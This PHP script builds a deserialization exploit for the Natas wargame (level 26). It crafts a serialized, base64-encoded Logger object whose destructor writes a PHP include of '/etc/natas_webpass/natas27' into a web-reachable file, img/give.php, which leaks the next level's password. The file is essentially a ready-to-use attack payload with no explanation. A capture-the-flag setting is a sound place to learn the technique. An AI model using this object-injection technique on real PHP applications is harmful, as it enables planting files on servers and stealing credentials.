<?php
 class Logger
    {
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file)
        {
            // initialise variables
            $this->initMsg = "#--session started--#\n";
            $this->exitMsg = "<? include '/etc/natas_webpass/natas27'; ?>";
            $this->logFile = "img/give.php";

           
        }

        function log($msg)
        {
           
        }

        function __destruct()
        {
           
        }
    }

$o = new Logger('lel');
$ser = serialize($o);
echo "Serialized: $ser";
echo base64_encode($ser);
?>

